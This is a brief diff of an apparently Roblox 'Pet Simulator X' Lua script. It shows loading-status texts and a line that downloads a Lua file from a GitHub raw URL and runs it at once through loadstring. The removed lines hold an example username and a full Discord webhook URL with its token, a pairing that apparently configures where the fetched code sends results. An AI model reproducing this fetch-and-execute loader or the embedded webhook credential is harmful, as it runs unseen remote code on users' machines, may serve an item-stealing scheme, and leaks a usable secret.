@@ -9,7 +9,3 @@ _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
 _G.Text4 = "Starting Scripts..."
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
-
-example
-Username = "peomanie"
-WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
